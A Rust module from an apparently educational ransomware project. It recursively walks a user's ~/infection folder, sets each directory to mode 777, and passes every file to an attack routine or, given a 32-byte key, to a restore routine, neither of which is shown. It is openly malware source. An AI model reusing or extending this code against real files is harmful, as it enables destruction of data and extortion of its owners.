use crate::free_files;
use crate::Args;
use crate::atk_files;
use std::path::{Path, PathBuf};
use whoami;
use std::fs::{self};
use std::os::unix::fs::PermissionsExt;

pub fn get_username() -> String {
    let user = whoami::username();
    user
}

pub fn get_path() -> String {
    let user = get_username();
    format!("/home/{}/infection", user)
}

pub fn start_randsom(args: &Args) -> Result<(), Box<dyn std::error::Error>> {
    let path = get_path();
    let dir = Path::new(&path);
    return search_and_processing(dir, args);
}

pub fn get_file_content(path: &PathBuf) -> Option<Vec<u8>> {
    let res = std::fs::read(path);
    match res {
        Ok(content) => {
            return Some(content);
        },
        Err(e) => {
            println!("{:?} : Error to read : {:?}", path, e);
            return None;
        }
    }
}

pub fn search_and_processing(dir: &Path, args: &Args) -> Result<(), Box<dyn std::error::Error>> {
    if dir.is_dir() {
        let mut perms = fs::metadata(dir)?.permissions();
        perms.set_mode(0o777);
        fs::set_permissions(dir, perms)?;
            for entry in fs::read_dir(dir)? {
                let entry = entry?;
                let path = entry.path();
                if path.is_dir() {
                    search_and_processing(&path, args)?;
                }
                if path.is_file() {
                    if args.key != None {
                        if args.key.as_ref().unwrap().len() != 32 {
                            println!("Wrong key size");
                            return Ok(());
                        }
                        free_files::free_process(&path, args);
                    } else {
                        atk_files::atk_process(&path, args);
                    }
                }
            }
    }
    Ok(())
}
